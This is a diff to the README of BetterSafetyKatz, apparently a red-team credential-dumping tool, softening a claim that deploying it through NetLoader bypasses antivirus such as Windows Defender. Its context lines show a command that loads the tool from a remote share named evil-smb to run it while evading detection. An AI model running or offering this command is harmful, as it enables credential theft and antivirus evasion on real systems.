@@ -16,7 +16,7 @@ BetterSafetyKatz is licensed under the BSD 3-Clause license.
 
 ## Detected?
 
-BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this will bypass common AV solutions such as Windows Defender.
+BetterSafetyKatz can be deployed using [NetLoader](https://github.com/Flangvik/NetLoader), this might bypass common AV solutions such as Windows Defender.
 
 	PS D:\Projects\NetLoader> .\NetLoader.exe --path //evil-smb/bins/BetterSafetyKatz.exe --args coffee
 	[!] ~Flangvik , ~Arno0x #NetLoader
